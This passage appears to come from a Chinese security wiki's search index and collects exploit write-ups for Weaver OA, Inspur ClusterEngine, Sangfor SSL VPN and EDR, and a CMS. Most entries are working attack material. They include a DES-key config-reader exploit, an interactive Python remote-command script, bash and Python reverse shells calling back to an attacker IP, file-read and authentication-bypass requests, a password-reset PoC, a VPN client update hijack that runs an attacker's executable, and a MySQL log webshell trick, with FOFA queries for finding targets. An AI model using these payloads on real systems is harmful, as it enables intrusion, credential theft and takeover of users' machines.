javax.crypto.Cipher; import javax.crypto.SecretKey; import javax.crypto.SecretKeyFactory; import javax.crypto.spec.DESKeySpec; import java.security.SecureRandom; public class ReadDbConfig { private final static String DES = \"DES\"; private final static String key = \"1z2x3c4v5b6n\"; public static void main(String[] args) throws Exception { if(args[0]!=null&& args[0].length() !=0){ String url = args[0]+\"/mobile/DBconfigReader.jsp\"; System.out.println(ReadConfig(url)); }else{ System.err.print(\"use: java -jar ecologyExp http://127.0.0.1\"); } } private static String ReadConfig(String url) throws Exception { CloseableHttpClient httpClient = HttpClientBuilder.create().build(); HttpGet httpGet = new HttpGet(url); CloseableHttpResponse response = httpClient.execute(httpGet); HttpEntity responseEntity = response.getEntity(); byte[] res1 = EntityUtils.toByteArray(responseEntity); byte[] data = subBytes(res1,10,res1.length-10); byte [] finaldata =decrypt(data,key.getBytes()); return (new String(finaldata)); } private static byte[] decrypt(byte[] data, byte[] key) throws Exception { SecureRandom sr = new SecureRandom(); DESKeySpec dks = new DESKeySpec(key); SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES); SecretKey securekey = keyFactory.generateSecret(dks); Cipher cipher = Cipher.getInstance(DES); cipher.init(Cipher.DECRYPT_MODE, securekey, sr); return cipher.doFinal(data); } public static byte[] subBytes(byte[] src, int begin, int count) { byte[] bs = new byte[count]; System.arraycopy(src, begin, bs, 0, count); return bs; } } Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:34 "},"Web安全/泛微oa/泛微OA 日志泄露/泛微OA 日志泄露.html":{"url":"Web安全/泛微oa/泛微OA 日志泄露/泛微OA 日志泄露.html","title":"泛微OA 日志泄露","keywords":"","body":"泛微oa 日志泄露 一、漏洞简介 二、漏洞影响 三、复现过程 读取物理路径 hrm/kq/gethrmkq.jsp?filename=1 日志下载 hrm/kq/gethrmkq.jsp?filename=1..\\1..\\1.txt Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:34 "},"Web安全/泛微oa/泛微OA 管理系统RCE漏洞/泛微OA 管理系统RCE漏洞.html":{"url":"Web安全/泛微oa/泛微OA 管理系统RCE漏洞/泛微OA 管理系统RCE漏洞.html","title":"泛微OA 管理系统RCE漏洞","keywords":"","body":"泛微OA 管理系统RCE漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 curl http://0-sec.org:8000/weaver/bsh.servlet.BshServlet -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:35 "},"Web安全/泛微云桥/泛微云桥任意文件读取/泛微云桥任意文件读取.html":{"url":"Web安全/泛微云桥/泛微云桥任意文件读取/泛微云桥任意文件读取.html","title":"泛微云桥任意文件读取","keywords":"","body":"泛微云桥任意文件读取 1.未授权读取。直接调用exp就OK http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt 2.任意读取linux的passwd值 可在响应包中JSON中包含ID的32位值 再次请求可获得/etc/passwd值 http://www.xxx.com/FileNoLogin/32位MD5值 http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt 3.任意读取winodws下的win.ini值 未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路 径从而下载数据库配置文件危害可见。 1.downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。 http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt 2.通过查看文件接口访问 /file/fileNoLogin/id 3.其他利用技巧(读取任意目录文件) 简单说说昨天泛微云桥的报告,输入文件路径->读取文件内容,我们读了一下代码后发现这还能读取文件目录。 参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历” /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///D:/&fileExt=txt 目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘 迅雷下载: d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:35 "},"Web安全/浪潮/浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞/浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞.html":{"url":"Web安全/浪潮/浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞/浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞.html","title":"浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞","keywords":"","body":"浪潮ClusterEngineV4.0 sysShell 远程命令执行漏洞 漏洞描述 浪潮ClusterEngineV4.0 存在远程命令执行，攻击者通过发送特殊的请求可以获取服务器权限 漏洞影响 [!NOTE] 浪潮ClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" 漏洞复现 登录页面如下 发送请求包 POST /sysShell HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: lang=cn Cache-Control: max-age=0 Content-Length: 42 op=doPlease&node=cu01&command=cat /etc/passwd [!NOTE] 注意参数 node 中的 cu01 需要为shell集群中的存在主机 这里可以配合任意用户登录漏洞查看主机名 漏洞利用 [!NOTE] 如过出现 Name or service not 请通过上述的方法查看 shell集群主机的名称（脚本默认 cu01） import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease&node=cu01&command=cat /etc/passwd\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/sysShell \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease&node=cu01&command={}\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] ClusterEngine V4.0 Shell cluster RCE Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:38 "},"Web安全/浪潮/浪潮ClusterEngineV4.0 任意用户登录漏洞/浪潮ClusterEngineV4.0 任意用户登录漏洞.html":{"url":"Web安全/浪潮/浪潮ClusterEngineV4.0 任意用户登录漏洞/浪潮ClusterEngineV4.0 任意用户登录漏洞.html","title":"浪潮ClusterEngineV4.0 任意用户登录漏洞","keywords":"","body":"浪潮ClusterEngineV4.0 任意用户登录漏洞 漏洞描述 浪潮ClusterEngineV4.0 存在任意用户登录漏洞，构造恶意的用户名和密码即可获取后台权限 漏洞影响 [!NOTE] 浪潮ClusterEngineV4.0 FOFA [!NOTE] title=\"TSCEV4.0\" 漏洞复现 登录页面如下 USER： admin|pwd PASS: 任意 成功登陆后台 [!NOTE] 部分功能是无法使用的 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:40 "},"Web安全/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224/浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224.html":{"url":"Web安全/浪潮/浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224/浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224.html","title":"浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224","keywords":"","body":"浪潮ClusterEngineV4.0 远程命令执行漏洞 CVE-2020-21224 漏洞描述 浪潮服务器群集管理系统存在危险字符未过滤，导致远程命令执行 漏洞影响 浪潮ClusterEngineV4.0 FOFA title=\"TSCEV4.0\" 漏洞复现 登录页面如下 由于登录页面没有发现验证码，进行账号爆破 当burpsuite爆破完成时，注意到POST数据中如果带有 ;' ，响应数据包发生异常。 通过响应包信息，猜测可能存在一个远程执行代码漏洞，并将此数据包放在repeater中，我发现如果发布数据中有一个'，系统将抛出异常。 进一步测试时，我发现username参数或password任一参数如果包含'，将引发此异常 尝试发送''来查看响应包。 我注意到 grep 命令错误，服务端的代码可能是这样 var1 = `grep xxxx` var2 = $(python -c \"from crypt import crypt;print crypt('$username','$1$$var1')\") 尝试发送 -V 和 --help 来查看响应包，响应包证实了猜测 尝试读取 /etc/passswd 尝试列目录 确认存在一个远程执行命令执行漏洞，经过fuzz，得到以下payload 反弹 shell op=login&username=1 2\\',\\'1\\'\\);`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261` payload发送后, 在 kali linux 服务器上获取了一个 root 权限的 shell 上面是原文的测试思路，但经过重新测试之后发现还有另一种简单方法 POC测试(出现 root:x:0:0 则存在漏洞) op=login&username=sec`$(cat /etc/passwd)` {\"err\":\"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\\n\",\"exitcode\":1,\"out\":\"the user peiqi does not exist\\nerror:1\\n\"} 反弹shell op=login&username=sec`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)` 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 浪潮ClusterEngineV4.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mIP >>> xxx.xxx.xxx.xxx:9999 \\033[0m') print('+ \\033[36mPORT >>> 9999 \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login&username=peiqi`$(cat /etc/passwd)`\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=4) etc_passwd = re.findall(r'\\{\"err\":\"/bin/sh: (.*?): No such', response.text) if response.status_code == 200 and \"root:x:0:0\" in response.text: print(\"\\033[32m[o] 目标 {} 可能存在漏洞, 响应为:{} \\033[0m\".format(target_url, etc_passwd[0])) POC_2(target_url) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def POC_2(target_url): IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) vuln_url = target_url + \"/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", } data = \"op=login&username=`bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`\".format(IP, PORT) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 ClusterEngineV4.0_RCE 参考文章 https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:41 "},"Web安全/深信服/深信服 SSL VPN - Pre Auth 任意密码重置/深信服 SSL VPN - Pre Auth 任意密码重置.html":{"url":"Web安全/深信服/深信服 SSL VPN - Pre Auth 任意密码重置/深信服 SSL VPN - Pre Auth 任意密码重置.html","title":"深信服 SSL VPN - Pre Auth 任意密码重置","keywords":"","body":"深信服 SSL VPN - Pre Auth 任意密码重置 一、漏洞简介 二、漏洞影响 高版本(如M7.6.8R2) 直接删除相关函数 低版本(如M7.6.6R1) 升级版存在此漏洞 打了 5.x-7.x 补丁的无法利用 三、复现过程 漏洞分析 差不多的逻辑 唯独多了个 RC4 解密，key 是 20100720 在数据提取中写的有点奇怪,使用,和=作为分隔符，所以我们的数据也要类似如： ,username=test,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=QQ123456, M7.6.6R1 key 为 20181118 M7.6.1 key 为 20100720 其他版本另寻 https://www.0-sec.org/por/changepwd.csp sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN poc poc.py rom Crypto.Cipher import ARC4 from binascii import a2b_hex def myRC4(data,key): rc41 = ARC4.new(key) encrypted = rc41.encrypt(data) return encrypted.encode('hex') def rc4_decrpt_hex(data,key): rc41 = ARC4.new(key) return rc41.decrypt(a2b_hex(data)) key = '20100720' data = r',username=2003010002,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=zxc123,' a = myRC4(data, key) print a print len(a) 参考链接 https://blog.sari3l.com/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:45 "},"Web安全/深信服/深信服 SSL VPN - Pre Auth 修改绑定手机/深信服 SSL VPN - Pre Auth 修改绑定手机.html":{"url":"Web安全/深信服/深信服 SSL VPN - Pre Auth 修改绑定手机/深信服 SSL VPN - Pre Auth 修改绑定手机.html","title":"深信服 SSL VPN - Pre Auth 修改绑定手机","keywords":"","body":"深信服 SSL VPN - Pre Auth 修改绑定手机 一、漏洞简介 二、漏洞影响 三、复现过程 老版本(M7.6.1)代码放上，看不懂的直接看 POC 吧；新版本的没绕成功还在审，所以不确定是不是这个 POC https://www.0-sec.org/por/changetelnum.csp?apiversion=1 newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1 参考链接 https://blog.sari3l.com/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:50 "},"Web安全/深信服/深信服 SSL VPN 客户端远程文件下载/深信服 SSL VPN 客户端远程文件下载.html":{"url":"Web安全/深信服/深信服 SSL VPN 客户端远程文件下载/深信服 SSL VPN 客户端远程文件下载.html","title":"深信服 SSL VPN 客户端远程文件下载","keywords":"","body":"深信服 SSL VPN 客户端远程文件下载 漏洞描述 深信服 SSL VPN 客户端存在远程文件下载，且文件可控下载后可执行 漏洞影响 [!NOTE] 深信服 SSL VPN 漏洞复现 百度\"intitle: 欢迎使用SSL VPN\"，随便找一个地方下载VPN客户端下载安装： 安装完之后访问VPN的页面，发现VPN会自动下载组件更新： 这些请求均为GET请求并附带着一些参数，我们把它一一列下来： 本地来看一下这个54530端口对应的进程是什么： 发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置： 确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对127.0.0.1的访问从而引起VPN进行组件更新。 通过以上的分析我们猜测了整个大致流程，但我们设想一下如果我们可以控制本地的更新指向我们的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我们可以拿到安装VPN客户端的使用者PC权限。 再回到之前的本地链接列表，根据对英文的理解，参数op的值应该为其具体对应要执行的动作： InitECAgent -> 初始化 GetEncryptKey -> 获取加密密钥 DoConfigure -> 配置 CheckReLogin -> 检查重新登录 CheckProxySetting -> 检查代理设置 UpdateControls -> 更新控制 DoQueryService -> 查询服务 第一个初始化的请求存在可控参数arg1： https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=vpn.xxx.edu.cn%20443&callback=EA_cb10000 参数arg1=vpn.xxx.edu.cn%20443，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为172.20.10.2 8000，然后本地搭建一个HTTP服务： python -m SimpleHTTPServer 其他的请求原封不动，依次请求一遍那一份URL 服务端成功收到请求，但是却出现了错误的提示： 首先我们已经验证了自己的猜想，更新地址是自己可控的，客户端确实会向我们指定的服务端发送请求，但由于出现了错误我们不知道客户端访问了哪个文件，也不知道访问文件之后做了什么动作。 现在要做的就是搭建一个客户端可以正常访问的请求，通过这个错误大致可以知道，我搭建的服务端协议和客户端请求使用的协议不一致，本机抓个包发现客户端请求的是 HTTPS 协议，这就需要搭建一个 HTTPS 服务了。 如下脚本基于Python库建立一个 HTTPS 服务： # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes import BaseHTTPServer, SimpleHTTPServer import ssl httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), SimpleHTTPServer.SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() 搭建起一个 HTTPS 环境后再次复现如上请求，服务端收到日志： 可以看见客户端会访问两个文件： /com/WindowsModule.xml /com/win/XXXUD.exe 先不管xml文件是怎么样的，可执行文件(exe)是需要重视的，但是这里通过提示可以看出客户端发出的请求是POST请求，但我们所写的Python脚本建立的HTTPS服务并不支持POST方法，我们需要重写一下Handler： import BaseHTTPServer import SimpleHTTPServer import cgi import ssl class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_POST(self): form = cgi.FieldStorage() SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self) Handler = ServerHandler httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), Handler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() 最终如上脚本支持POST方法，当时用POST方法请求时即返回文件内容。 最后，拖一个calc.exe（计算器）到HTTPS网站根目录下的/com/win/XXXUD.exe。 依次请求（经过多次复现发现，这三个请求才是重点的，其他的可以忽略）： https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=172.20.10.2 8000&callback=EA_cb10000 https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&token=50065256e83ff1bb9e01757d0d22b669&callback=EA_cb10003 https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&callback=EA_cb10005 会发现客户端请求之后，将文件下载到本地并启动该程序，成功弹出计算器： Exploit很简单，当用户打开某个页面时访问那三个本地请求即可，这里使用JavaScript的fetch去实现即可： // 服务器IP和端口 var ip = \"172.20.10.2\"; var port = \"4443\"; var poc_list = [\"https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=\" + ip + \" \" + port + \"&Guid=&callback=EA_cb10000\", \"https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&token=c4202416e283e60809d3b1e04e4bae6b&Guid=&callback=EA_cb10003\", \"https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&Guid=&callback=EA_cb10005\"]; for(var i=0; i 其次就是需要一个HTTPS服务端的Python脚本，并且在脚本根目录下的/com/win/目录下有一个XXXUD.exe文件。 参考文章 https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:52 "},"Web安全/深信服/深信服 SSL VPN 解密/深信服 SSL VPN 解密.html":{"url":"Web安全/深信服/深信服 SSL VPN 解密/深信服 SSL VPN 解密.html","title":"深信服 SSL VPN 解密","keywords":"","body":"import sqlite3 import sys import os import shutil if __name__ == '__main__': if len(sys.argv) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:54 "},"Web安全/深信服/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）.html":{"url":"Web安全/深信服/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）.html","title":"深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一）","keywords":"","body":"深信服 终端检测相应平台（EDR） 任意命令执行漏洞（一） 一、漏洞简介 二、漏洞影响 深信服EDR 3.2.16 深信服EDR 3.2.17 深信服EDR 3.2.19 三、复现过程 payload： https://www.0-sec.org/tool/log/c.php?strip_slashes=system&limit=whoami https://www.0-sec.org/tool/log/c.php?strip_slashes=system&host=whoami https://www.0-sec.org/tool/log/c.php?strip_slashes=system&path=whoami https://www.0-sec.org/tool/log/c.php?strip_slashes=system&row=whoami 任意命令执行漏洞(一)/media/rId25.png) 反弹shell payload POST /tool/log/c.php HTTP/1.1 Host: www.0-sec.org Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0 DNT: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=b1464478cad68327229d8f46e60d0a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903 Content-Length: 256 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:54 "},"Web安全/深信服/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（二）/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（二）.html":{"url":"Web安全/深信服/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（二）/深信服 终端检测相应平台（EDR） 任意命令执行漏洞（二）.html","title":"深信服 终端检测相应平台（EDR） 任意命令执行漏洞（二）","keywords":"","body":"深信服 终端检测相应平台（EDR） 任意命令执行漏洞（二） 一、漏洞简介 二、漏洞影响 深信服EDR 3.2.16 深信服EDR 3.2.17 深信服EDR 3.2.19 三、复现过程 任意命令执行漏洞(二)/media/rId24.jpg) dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口 主要调用 任意命令执行漏洞(二)/media/rId25.jpg) 跟进 任意命令执行漏洞(二)/media/rId26.jpg) 可以看到 第一个检查为 $req_url = $_SERVER['PHP_SELF']; 绕过第一个检查: 在他们系统nginx配置文件里面: 任意命令执行漏洞(二)/media/rId27.jpg) 通过nginx规则可以得知**,他们没有设置禁止外网访问.**从而可以直接访问 /api/edr/sangforinter/v2/xxx 绕过 第一个检查 第二检查**:** 权限检查 任意命令执行漏洞(二)/media/rId28.jpg) 跟进check_access_token 任意命令执行漏洞(二)/media/rId29.jpg) 这里****if($md5_str == $json_token[\"md5\"]) 引发第二个漏洞**: php****弱类型导致的漏洞** 绕过只需要传入一个base64编码的json内容为 **{\"md5\":true}**即可 至此 权限检查绕过完毕 来到 process_cssp.php 文件 任意命令执行漏洞(二)/media/rId30.jpg) 存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的.https://www.0-sec.org:8443//api/edr/sangforinter/v2/cssp/slog_client?token=eyJyYW5kb20iOiIxIiwgIm1kNSI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIn0= 绕过:{“params”:”|命令”} 结果如下: 任意命令执行漏洞(二)/media/rId31.jpg) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:55 "},"Web安全/深信服/深信服 终端检测相应平台（EDR） 任意用户登陆漏洞/深信服 终端检测相应平台（EDR） 任意用户登陆漏洞.html":{"url":"Web安全/深信服/深信服 终端检测相应平台（EDR） 任意用户登陆漏洞/深信服 终端检测相应平台（EDR） 任意用户登陆漏洞.html","title":"深信服 终端检测相应平台（EDR） 任意用户登陆漏洞","keywords":"","body":"深信服 终端检测相应平台（EDR） 任意用户登陆漏洞 一、漏洞简介 二、漏洞影响 EDR \\ 三、复现过程 payload：user后面任意填写都ok https://www.0-sec.org:443/ui/login.php?user=admin 任意用户登陆漏洞/media/rId24.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:59 "},"Web安全/深信服/深信服行为感知系统和日志中心 远程命令执行漏洞/深信服行为感知系统和日志中心 远程命令执行漏洞.html":{"url":"Web安全/深信服/深信服行为感知系统和日志中心 远程命令执行漏洞/深信服行为感知系统和日志中心 远程命令执行漏洞.html","title":"深信服行为感知系统和日志中心 远程命令执行漏洞","keywords":"","body":"深信服行为感知系统&&日志中心 远程命令执行漏洞 漏洞描述 深信服行为感知系统&&日志中心 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行 漏洞影响 深信服 行为感知系统和日志中心 FOFA body=\"isHighPerformance : !!SFIsHighPerformance,\" 漏洞复现 漏洞URL为： /tool/log/c.php?strip_slashes=system&host= 例如我要查看目标机器的系统信息： https://x.x.x.x/tool/log/c.php?strip_slashes=system&host=systeminfo Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:59 "},"Web安全/狂雨cms/狂雨CMS后台SQL代码执行/狂雨CMS后台SQL代码执行.html":{"url":"Web安全/狂雨cms/狂雨CMS后台SQL代码执行/狂雨CMS后台SQL代码执行.html","title":"狂雨CMS后台SQL代码执行","keywords":"","body":"狂雨CMS后台SQL代码执行 审计 application/admin/controller/Tool.php->sqlexecute() public function sqlexecute(){ if($this->request->isPost()){ $sql=$this->request->param('sql'); if(!empty($sql)){ $sql = str_replace('{pre}',Config::get('database.prefix'),$sql); //查询语句返回结果集 if(strtolower(substr($sql,0,6))==\"select\"){ } else{ $return = Db::execute($sql); } } return $this->success('执行完成'); }else{ $this->assign('meta_title','SQL语句执行'); return $this->fetch(); } } Db是thinkphp内置类，可以看到前六个字符是select的话其实什么都没有执行。。。报错的话无法存入log中，所以用了create 防御方法 针对传入的语句进行限制，比如只能进行查询操作。建议最好还是直接取消这个功能，对SQL的操作直接在服务器上进行，放在后台实在是弊大于利 漏洞复现 后台存在SQL代码执行功能 但secure_file_priv设置为空，无法导出文件，可以利用general_log进行getshell 依次执行以下代码 set global general_log=On; set global general_log_file=\"D:\\\\phpstudy_pro\\\\WWW\\\\123.php\"; create table tmp (value varchar(25)); insert into tmp (value) values (\"\"); drop table tmp; set global general_log=Off; 得到general_log，内容如图所示 访问即可看到phpinfo 参考 https://www.cnblogs.com/0daybug/p/12624364.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 